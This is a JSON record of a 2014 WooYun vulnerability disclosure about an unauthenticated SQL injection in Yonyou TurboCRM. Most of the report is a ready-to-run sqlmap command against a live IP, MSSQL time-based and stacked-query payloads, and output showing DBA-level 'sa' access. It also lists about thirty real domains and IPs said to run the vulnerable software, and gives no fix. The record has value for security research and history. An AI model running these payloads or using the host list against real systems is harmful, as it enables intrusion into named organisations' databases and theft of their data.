{"id": 973, "wybug_id": "wooyun-2014-067800", "wybug_title": "用友CRM注入漏洞（无需登录通杀所有版本）", "wybug_corp": "用友软件", "wybug_author": "路人甲", "wybug_date": "2014-07-08 10:46", "wybug_open_date": "2014-10-03 10:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-13：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-03：\t细节向公众公开  简要描述： 用友CRM注入漏洞，无需登录，通杀所有版本 详细说明：  漏洞url：\nhttp://220.178.27.116:8001/webservice/service.php?class=WS_System&orgcode=1\n使用sqlmap进行注入。\nsqlmap.py -u \"http://220.178.27.116:8001/webservice/service.php?class=WS_System&orgcode=1\" --current-user --current-db  --is-dba\n\nsqlmap identified the following injection points with a total of 0 HTTP(s) reque sts: --- Place: GET Parameter: orgcode Type: stacked queries Title: Microsoft SQL Server/Sybase stacked queries Payload: class=WS_System&orgcode=1'; WAITFOR DELAY '0:0:5'-- Type: AND/OR time-based blind Title: Microsoft SQL Server/Sybase time-based blind Payload: class=WS_System&orgcode=1' WAITFOR DELAY '0:0:5'-- ---\n\ncurrent user: 'sa' current database: 'turbocrm70' current user is DBA: True\n整理出了以下使用这套crm的网站，title:用友TurboCRM\n182.135.191.86111.40.0.242:9091222.171.32.36:9091219.90.119.35:8081180.168.98.94:8088prm.yonyou.comwww.kdlian.com:8001prm.chanjet.comqinyuancrm.comkfdq369.gicp.net220.113.5.194218.84.134.162:8088turbocrm.yofc.comcrm.elfa.com.cncrm.pearmain.cnnc.shineroad.comcrm.westernpower.cncrm7.abgroup.cncrm.transn.netzh4433.vicp.net218.108.86.226crm.yiwenkeji.com:8080218.95.66.88:9036crm.digisystem.com.cn:8080crm.shineroad.comcrm.siweidg.com222.41.174.190:8088\n   漏洞证明：  \nsqlmap.py -u \"http://220.178.27.116:8001/webservice/service.php?class=WS_System&orgcode=1\" --current-user --current-db  --is-dba\n\nsqlmap identified the following injection points with a total of 0 HTTP(s) reque sts: --- Place: GET Parameter: orgcode Type: stacked queries Title: Microsoft SQL Server/Sybase stacked queries Payload: class=WS_System&orgcode=1'; WAITFOR DELAY '0:0:5'-- Type: AND/OR time-based blind Title: Microsoft SQL Server/Sybase time-based blind Payload: class=WS_System&orgcode=1' WAITFOR DELAY '0:0:5'-- ---\n\ncurrent user: 'sa' current database: 'turbocrm70' current user is DBA: True\n\n\n   修复方案：  .....................   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-10-03 10:48 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-08 10:50 |    \t\tzhxs \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:19        | Jyhack-TeaM：http://bbs.jyhack.com/)\t\t \n  好牛逼、小菜膜拜一下哈.    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}